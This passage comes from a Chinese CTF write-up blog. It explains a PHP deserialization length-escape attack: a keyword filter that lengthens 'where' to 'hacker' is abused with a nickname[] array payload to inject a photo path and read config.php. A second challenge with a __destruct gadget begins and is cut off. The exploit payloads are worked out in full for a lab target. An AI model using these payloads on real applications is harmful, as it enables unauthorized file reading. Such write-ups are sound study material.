		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO <span class="token interpolation"><span class="token variable">$table</span></span> (<span class="token interpolation"><span class="token variable">$key</span></span>) VALUES (<span class="token interpolation"><span class="token variable">$value</span></span>)"</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE <span class="token interpolation"><span class="token variable">$table</span></span> SET <span class="token interpolation"><span class="token variable">$key</span></span> = '<span class="token interpolation"><span class="token variable">$value</span></span>' WHERE <span class="token interpolation"><span class="token variable">$where</span></span>"</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>
		<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> __class__<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>config.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>看最后一个config.php中包含flag，题目要求应该是要我们config.php文件，寻找利用点</p>
<p>在profile.php中看到有一行代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>明显的文件读取操作，而在代码上发现有一个反序列化操作</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>找到<code>$profile</code>的定义</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>跟进<code>show_profile</code>函数</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-></span><span class="token property">profile</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>存在一个对数据库的查询操作，于是寻找数据库写入操作</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在找到引用过这个函数的代码，在update.php中</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>可看到存在序列化操作，至此关系以及理清楚</p>
<p>通过对<code>$profile</code>传入序列化后的字符串再绕过阻碍达到利用<code>file_get_contents</code>读取文件的操作</p>
<p>再细看代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>$profile是这样定义的结合上面的读取文件操作可知其中的photo变量如果控制令其为config.php即可读取到flag，于是初步payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"upload/0cc175b9c0f1b6a831c399e269772661"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>反序列化只反到第一个<code>&#125;</code>结束，后面的自动丢弃，但是photo似乎不是我们能够直接控制的，源码中<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>，也就是说我们不能直接更改photo中的内容了，于是就需要找到序列化后的其它可利用参数再其后写上<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，达到修改的效果，phone，email，nickname都是我们可控的，而phone和email经过了严格的过滤（详情看上面的update.php源码），再来看看nickname：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p><code>nickname[]</code>数组绕过<code>preg_match</code>和<code>strlen</code>即可，两边判断均为<code>false</code>，故不会执行if中的语句，于是再构造payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"upload/0cc175b9c0f1b6a831c399e269772661"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>到这里是否就已经可以成功读取到文件了呢？并非如此，如果要进行如上的操作，就需要给<code>nickname[]</code>传<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这样的一个值，传入后将会是这个样子</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";&#125;s:5:"</span>photo<span class="token string double-quoted-string">";s:39:"</span>upload<span class="token operator">/</span><span class="token number">0</span>cc175b9c0f1b6a831c399e269772661"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>虽然看上去大括号被闭合了，但是要注意到<code>s:34</code>这里，在反序列化的时候进行数据读取的时候依然会读取到引号中的34位字符，就对于没有闭合上，那有该如何利用呢？再接着看代码，</p>
<p>看看将<code>$profile</code>序列化结果存入数据库时的操作：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可看见对传入的参数进行了处理，跟进父类的<code>filter</code>方法：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>
<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可见<code>$string</code>参数经过了两次过滤，第一次等于没用，两次应该都是来防止sql注入的，但这里似乎也不存在sql注入，序列化后的<code>$profile</code>不可能有sql注入风险，而<code>$username</code>的取值来自<code>$_SESSION[&#39;username&#39;]</code>，而<code>username</code>的<code>session</code>是系统分配的，这里也不存在sql注入，所以想想怎么利用在反序列化上面</p>
<p>这里就涉及到本题的核心了，<strong>反序列化长度逃逸字符</strong></p>
<p>在php反序列化的守护是根据s后面的值来取字符串长度的，而在<code>filter</code>方法总存在<code>preg_replace</code>替换，如果有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>其中之一就替换成<code>&#39;hacker&#39;</code>，<code>hacker</code>长度为6位，试想如果替换了里面长度小于6位的字符串，而s后的取值长度发值有没变，那么就会有末尾的字符溢出不会被读取到，而没被读取到的话自然就被当做序列化后的格式处理，再结合这里，改闭合的大括号就可以闭合的上，再看看我们需要逃逸的字符串<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，就是这34位，而替换的字符串中正好一个有比<code>hacker</code>短的字符串<code>where</code>，那么一次就可以逃逸一个出来，那么直接传入34个<code>where</code>就可以将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>完整的逃逸出来，于是最终<code>payload</code>如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";&#125;s:5:"</span>photo<span class="token string double-quoted-string">";s:39:"</span>upload<span class="token operator">/</span><span class="token number">0</span>cc175b9c0f1b6a831c399e269772661"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>令<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>即可</p>
<p>随后发包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt loading="lazy"></p>
<p>查看<code>profile.php</code>网页页面源代码，将图片的base64解可得到<code>config.php</code>的内容，即可得到flag</p>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12后点进去可以看到源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">#error_reporting(0);</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
